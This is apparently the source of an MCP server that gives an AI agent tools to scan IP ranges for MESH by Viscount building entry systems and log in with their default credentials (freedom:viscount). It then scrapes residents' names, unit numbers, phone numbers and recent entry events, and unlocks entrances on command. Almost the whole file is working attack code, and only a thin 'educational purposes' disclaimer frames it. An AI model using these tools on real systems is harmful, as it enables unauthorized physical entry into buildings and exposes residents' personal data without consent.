#!/usr/bin/env node
/**
 * MESH by Viscount Vulnerability Scanner MCP Server
 *
 * This server provides tools to:
 * - Scan for MESH by Viscount systems
 * - Test for default credentials vulnerability (freedom:viscount)
 * - Access system information (users, events, etc.)
 * - Perform actions like unlocking entrances
 *
 * For educational and security research purposes only.
 */
import { Server } from "@modelcontextprotocol/sdk/server/index.js";
import { StdioServerTransport } from "@modelcontextprotocol/sdk/server/stdio.js";
import { CallToolRequestSchema, ErrorCode, ListResourcesRequestSchema, ListToolsRequestSchema, McpError, ReadResourceRequestSchema, } from "@modelcontextprotocol/sdk/types.js";
import axios from "axios";
import * as cheerio from "cheerio";
// In-memory storage
const scanResults = [];
const vulnerableSystems = [];
const systemInfoCache = new Map();
// Default credentials
const DEFAULT_USERNAME = "freedom";
const DEFAULT_PASSWORD = "viscount";
// Create MCP server
const server = new Server({
    name: "mesh-scanner",
    version: "0.1.0",
}, {
    capabilities: {
        resources: {},
        tools: {},
    },
});
/**
 * Handler for listing available resources
 */
server.setRequestHandler(ListResourcesRequestSchema, async () => {
    return {
        resources: [
            {
                uri: "mesh://scan-results",
                mimeType: "application/json",
                name: "MESH Scan Results",
                description: "Results of the most recent scan for MESH systems"
            },
            {
                uri: "mesh://vulnerable-systems",
                mimeType: "application/json",
                name: "Vulnerable MESH Systems",
                description: "List of MESH systems vulnerable to default credentials"
            }
        ]
    };
});
/**
 * Handler for reading resources
 */
server.setRequestHandler(ReadResourceRequestSchema, async (request) => {
    const uri = request.params.uri;
    if (uri === "mesh://scan-results") {
        return {
            contents: [{
                    uri: uri,
                    mimeType: "application/json",
                    text: JSON.stringify(scanResults, null, 2)
                }]
        };
    }
    else if (uri === "mesh://vulnerable-systems") {
        return {
            contents: [{
                    uri: uri,
                    mimeType: "application/json",
                    text: JSON.stringify(vulnerableSystems, null, 2)
                }]
        };
    }
    else if (uri.startsWith("mesh://system-info/")) {
        const ipAddress = uri.replace("mesh://system-info/", "");
        const systemInfo = systemInfoCache.get(ipAddress);
        if (!systemInfo) {
            throw new McpError(ErrorCode.InvalidRequest, `System info for ${ipAddress} not found. Run get_system_info tool first.`);
        }
        return {
            contents: [{
                    uri: uri,
                    mimeType: "application/json",
                    text: JSON.stringify(systemInfo, null, 2)
                }]
        };
    }
    throw new McpError(ErrorCode.InvalidRequest, `Invalid URI: ${uri}`);
});
/**
 * Handler for listing available tools
 */
server.setRequestHandler(ListToolsRequestSchema, async () => {
    return {
        tools: [
            {
                name: "scan_ip",
                description: "Scan a single IP address for MESH system and test default credentials",
                inputSchema: {
                    type: "object",
                    properties: {
                        ipAddress: {
                            type: "string",
                            description: "IP address to scan (e.g., 192.168.1.1)"
                        },
                        timeout: {
                            type: "number",
                            description: "Timeout in milliseconds (default: 5000)"
                        }
                    },
                    required: ["ipAddress"]
                }
            },
            {
                name: "scan_ip_range",
                description: "Scan a range of IP addresses for MESH systems and test default credentials",
                inputSchema: {
                    type: "object",
                    properties: {
                        startIp: {
                            type: "string",
                            description: "Starting IP address (e.g., 192.168.1.1)"
                        },
                        endIp: {
                            type: "string",
                            description: "Ending IP address (e.g., 192.168.1.254)"
                        },
                        timeout: {
                            type: "number",
                            description: "Timeout in milliseconds (default: 5000)"
                        },
                        concurrency: {
                            type: "number",
                            description: "Number of concurrent scans (default: 5)"
                        }
                    },
                    required: ["startIp", "endIp"]
                }
            },
            {
                name: "test_default_credentials",
                description: "Test if a MESH system is vulnerable to default credentials",
                inputSchema: {
                    type: "object",
                    properties: {
                        url: {
                            type: "string",
                            description: "URL of the MESH system (e.g., http://192.168.1.1)"
                        }
                    },
                    required: ["url"]
                }
            },
            {
                name: "get_system_info",
                description: "Get information about a vulnerable MESH system (users, events, etc.)",
                inputSchema: {
                    type: "object",
                    properties: {
                        url: {
                            type: "string",
                            description: "URL of the vulnerable MESH system"
                        }
                    },
                    required: ["url"]
                }
            },
            {
                name: "unlock_entrance",
                description: "Unlock an entrance (for educational purposes only)",
                inputSchema: {
                    type: "object",
                    properties: {
                        url: {
                            type: "string",
                            description: "URL of the vulnerable MESH system"
                        },
                        entranceId: {
                            type: "string",
                            description: "ID of the entrance to unlock"
                        }
                    },
                    required: ["url", "entranceId"]
                }
            }
        ]
    };
});
/**
 * Convert IP address to number for range calculations
 */
function ipToLong(ip) {
    const parts = ip.split('.');
    return ((parseInt(parts[0], 10) << 24) |
        (parseInt(parts[1], 10) << 16) |
        (parseInt(parts[2], 10) << 8) |
        parseInt(parts[3], 10)) >>> 0;
}
/**
 * Convert number to IP address
 */
function longToIp(long) {
    return [
        (long >>> 24) & 0xff,
        (long >>> 16) & 0xff,
        (long >>> 8) & 0xff,
        long & 0xff
    ].join('.');
}
/**
 * Test if a URL is a MESH system
 */
async function isMeshSystem(url, timeout = 5000) {
    try {
        const response = await axios.get(`${url}/mesh/servlet/mesh.webadmin.MESHAdminServlet`, {
            timeout,
            validateStatus: () => true
        });
        return response.status === 200 &&
            response.data.includes("FREEDOM Administration Login");
    }
    catch (error) {
        return false;
    }
}
/**
 * Test if a MESH system is vulnerable to default credentials
 */
async function testDefaultCredentials(url) {
    try {
        const response = await axios.post(`${url}/mesh/servlet/mesh.webadmin.MESHAdminServlet?requestedAction=login`, `formLoginName=${DEFAULT_USERNAME}&formLoginPassword=${DEFAULT_PASSWORD}&formLanguage=en&formLogRefreshInterval=0&formPageSize=100`, {
            headers: {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': 'en-US,en;q=0.9',
                'Cache-Control': 'max-age=0',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': 'MESHWebAdminLanguage=en; MESHWebAdminRefreshInterval=0; MESHWebAdminPageSize=100',
                'Connection': 'keep-alive'
            },
            maxRedirects: 5
        });
        const isVulnerable = response.status === 200 &&
            !response.data.includes("Login Failed. Invalid username or password.");
        let buildingName = undefined;
        let buildingAddress = undefined;
        if (isVulnerable) {
            // Try to extract building name and address
            const $ = cheerio.load(response.data);
            const siteTitle = $('title').text();
            if (siteTitle && siteTitle !== "FREEDOM Administration") {
                buildingName = siteTitle.replace(" - FREEDOM Administration", "").trim();
                // Try to find address in the page
                const addressText = $('body').text();
                const addressMatch = addressText.match(/\d+\s+[A-Za-z\s]+,\s+[A-Za-z\s]+,\s+[A-Z]{2}/);
                if (addressMatch) {
                    buildingAddress = addressMatch[0];
                }
            }
        }
        return { vulnerable: isVulnerable, buildingName, buildingAddress };
    }
    catch (error) {
        return { vulnerable: false };
    }
}
/**
 * Get system information from a vulnerable MESH system
 */
async function getSystemInfo(url) {
    try {
        // First login
        await axios.post(`${url}/mesh/servlet/mesh.webadmin.MESHAdminServlet?requestedAction=login`, `formLoginName=${DEFAULT_USERNAME}&formLoginPassword=${DEFAULT_PASSWORD}&formLanguage=en&formLogRefreshInterval=0&formPageSize=100`, {
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': 'MESHWebAdminLanguage=en; MESHWebAdminRefreshInterval=0; MESHWebAdminPageSize=100'
            },
            maxRedirects: 5
        });
        // Get cookies from login response
        const cookieResponse = await axios.get(`${url}/mesh/servlet/mesh.webadmin.MESHAdminServlet`, {
            maxRedirects: 5
        });
        const cookies = cookieResponse.headers['set-cookie'] || [];
        const cookieString = cookies.join('; ');
        // Get building info
        const siteResponse = await axios.get(`${url}/mesh/servlet/mesh.webadmin.MESHAdminServlet?requestedAction=viewSite`, {
            headers: {
                'Cookie': cookieString
            }
        });
        const $ = cheerio.load(siteResponse.data);
        const buildingName = $('title').text().replace(" - FREEDOM Administration", "").trim();
        let buildingAddress = "Unknown";
        // Try to find address in the page
        const addressText = $('body').text();
        const addressMatch = addressText.match(/\d+\s+[A-Za-z\s]+,\s+[A-Za-z\s]+,\s+[A-Z]{2}/);
        if (addressMatch) {
            buildingAddress = addressMatch[0];
        }
        // Get users
        const usersResponse = await axios.get(`${url}/mesh/servlet/mesh.webadmin.MESHAdminServlet?requestedAction=viewUsers`, {
            headers: {
                'Cookie': cookieString
            }
        });
        const users = [];
        const $users = cheerio.load(usersResponse.data);
        $users('table tr').each((i, elem) => {
            if (i === 0)
                return; // Skip header row
            const columns = $users(elem).find('td');
            if (columns.length >= 3) {
                const name = $users(columns[0]).text().trim();
                const unitNumber = $users(columns[1]).text().trim();
                const phoneNumber = $users(columns[2]).text().trim();
                if (name && unitNumber) {
                    users.push({ name, unitNumber, phoneNumber });
                }
            }
        });
        // Get events
        const eventsResponse = await axios.get(`${url}/mesh/servlet/mesh.webadmin.MESHAdminServlet?requestedAction=viewEvents`, {
            headers: {
                'Cookie': cookieString
            }
        });
        const recentEvents = [];
        const $events = cheerio.load(eventsResponse.data);
        $events('table tr').each((i, elem) => {
            if (i === 0)
                return; // Skip header row
            if (i > 10)
                return; // Only get 10 most recent events
            const columns = $events(elem).find('td');
            if (columns.length >= 4) {
                const timestamp = $events(columns[0]).text().trim();
                const unitNumber = $events(columns[1]).text().trim();
                const action = $events(columns[2]).text().trim();
                const location = $events(columns[3]).text().trim();
                if (timestamp && unitNumber) {
                    recentEvents.push({ timestamp, unitNumber, action, location });
                }
            }
        });
        return {
            buildingName,
            buildingAddress,
            users,
            recentEvents
        };
    }
    catch (error) {
        console.error("Error getting system info:", error);
        return null;
    }
}
/**
 * Unlock an entrance
 */
async function unlockEntrance(url, entranceId) {
    try {
        // First login
        await axios.post(`${url}/mesh/servlet/mesh.webadmin.MESHAdminServlet?requestedAction=login`, `formLoginName=${DEFAULT_USERNAME}&formLoginPassword=${DEFAULT_PASSWORD}&formLanguage=en&formLogRefreshInterval=0&formPageSize=100`, {
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': 'MESHWebAdminLanguage=en; MESHWebAdminRefreshInterval=0; MESHWebAdminPageSize=100'
            },
            maxRedirects: 5
        });
        // Get cookies from login response
        const cookieResponse = await axios.get(`${url}/mesh/servlet/mesh.webadmin.MESHAdminServlet`, {
            maxRedirects: 5
        });
        const cookies = cookieResponse.headers['set-cookie'] || [];
        const cookieString = cookies.join('; ');
        // Unlock entrance
        await axios.get(`${url}/mesh/servlet/mesh.webadmin.MESHAdminServlet?requestedAction=unlockEntrance&entranceId=${entranceId}`, {
            headers: {
                'Cookie': cookieString
            }
        });
        return true;
    }
    catch (error) {
        console.error("Error unlocking entrance:", error);
        return false;
    }
}
/**
 * Handler for tool calls
 */
server.setRequestHandler(CallToolRequestSchema, async (request) => {
    switch (request.params.name) {
        case "scan_ip": {
            const ipAddress = String(request.params.arguments?.ipAddress);
            const timeout = Number(request.params.arguments?.timeout) || 5000;
            if (!ipAddress) {
                throw new McpError(ErrorCode.InvalidParams, "IP address is required");
            }
            const url = `http://${ipAddress}`;
            const isMesh = await isMeshSystem(url, timeout);
            let result = {
                ipAddress,
                url,
                vulnerable: false,
                timestamp: new Date().toISOString()
            };
            if (isMesh) {
                const { vulnerable, buildingName, buildingAddress } = await testDefaultCredentials(url);
                result.vulnerable = vulnerable;
                result.buildingName = buildingName;
                result.buildingAddress = buildingAddress;
                scanResults.push(result);
                if (vulnerable) {
                    vulnerableSystems.push(result);
                }
            }
            return {
                content: [{
                        type: "text",
                        text: JSON.stringify(result, null, 2)
                    }]
            };
        }
        case "scan_ip_range": {
            const startIp = String(request.params.arguments?.startIp);
            const endIp = String(request.params.arguments?.endIp);
            const timeout = Number(request.params.arguments?.timeout) || 5000;
            const concurrency = Number(request.params.arguments?.concurrency) || 5;
            if (!startIp || !endIp) {
                throw new McpError(ErrorCode.InvalidParams, "Start and end IP addresses are required");
            }
            const startLong = ipToLong(startIp);
            const endLong = ipToLong(endIp);
            if (startLong > endLong) {
                throw new McpError(ErrorCode.InvalidParams, "Start IP must be less than or equal to end IP");
            }
            const results = [];
            const ipCount = endLong - startLong + 1;
            // Process IPs in batches for concurrency
            for (let i = 0; i < ipCount; i += concurrency) {
                const batch = [];
                for (let j = 0; j < concurrency && i + j < ipCount; j++) {
                    const ip = longToIp(startLong + i + j);
                    batch.push(ip);
                }
                const batchPromises = batch.map(async (ip) => {
                    const url = `http://${ip}`;
                    const isMesh = await isMeshSystem(url, timeout);
                    let result = {
                        ipAddress: ip,
                        url,
                        vulnerable: false,
                        timestamp: new Date().toISOString()
                    };
                    if (isMesh) {
                        const { vulnerable, buildingName, buildingAddress } = await testDefaultCredentials(url);
                        result.vulnerable = vulnerable;
                        result.buildingName = buildingName;
                        result.buildingAddress = buildingAddress;
                        scanResults.push(result);
                        if (vulnerable) {
                            vulnerableSystems.push(result);
                        }
                    }
                    return result;
                });
                const batchResults = await Promise.all(batchPromises);
                results.push(...batchResults);
            }
            return {
                content: [{
                        type: "text",
                        text: JSON.stringify(results, null, 2)
                    }]
            };
        }
        case "test_default_credentials": {
            const url = String(request.params.arguments?.url);
            if (!url) {
                throw new McpError(ErrorCode.InvalidParams, "URL is required");
            }
            const isMesh = await isMeshSystem(url);
            if (!isMesh) {
                return {
                    content: [{
                            type: "text",
                            text: JSON.stringify({ error: "Not a MESH system" }, null, 2)
                        }]
                };
            }
            const { vulnerable, buildingName, buildingAddress } = await testDefaultCredentials(url);
            const result = {
                url,
                vulnerable,
                buildingName,
                buildingAddress,
                timestamp: new Date().toISOString()
            };
            return {
                content: [{
                        type: "text",
                        text: JSON.stringify(result, null, 2)
                    }]
            };
        }
        case "get_system_info": {
            const url = String(request.params.arguments?.url);
            if (!url) {
                throw new McpError(ErrorCode.InvalidParams, "URL is required");
            }
            const ipAddress = new URL(url).hostname;
            // Check if system is vulnerable first
            const { vulnerable } = await testDefaultCredentials(url);
            if (!vulnerable) {
                return {
                    content: [{
                            type: "text",
                            text: JSON.stringify({ error: "System is not vulnerable to default credentials" }, null, 2)
                        }]
                };
            }
            const systemInfo = await getSystemInfo(url);
            if (!systemInfo) {
                return {
                    content: [{
                            type: "text",
                            text: JSON.stringify({ error: "Failed to get system information" }, null, 2)
                        }]
                };
            }
            // Cache the system info
            systemInfoCache.set(ipAddress, systemInfo);
            return {
                content: [{
                        type: "text",
                        text: JSON.stringify(systemInfo, null, 2)
                    }]
            };
        }
        case "unlock_entrance": {
            const url = String(request.params.arguments?.url);
            const entranceId = String(request.params.arguments?.entranceId);
            if (!url || !entranceId) {
                throw new McpError(ErrorCode.InvalidParams, "URL and entrance ID are required");
            }
            // Check if system is vulnerable first
            const { vulnerable } = await testDefaultCredentials(url);
            if (!vulnerable) {
                return {
                    content: [{
                            type: "text",
                            text: JSON.stringify({ error: "System is not vulnerable to default credentials" }, null, 2)
                        }]
                };
            }
            const success = await unlockEntrance(url, entranceId);
            return {
                content: [{
                        type: "text",
                        text: JSON.stringify({ success, message: success ? "Entrance unlocked successfully" : "Failed to unlock entrance" }, null, 2)
                    }]
            };
        }
        default:
            throw new McpError(ErrorCode.MethodNotFound, `Unknown tool: ${request.params.name}`);
    }
});
/**
 * Start the server
 */
async function main() {
    const transport = new StdioServerTransport();
    await server.connect(transport);
    console.error("MESH Scanner MCP server running on stdio");
    // Error handling
    server.onerror = (error) => console.error("[MCP Error]", error);
    process.on("SIGINT", async () => {
        await server.close();
        process.exit(0);
    });
}
main().catch((error) => {
    console.error("Server error:", error);
    process.exit(1);
});
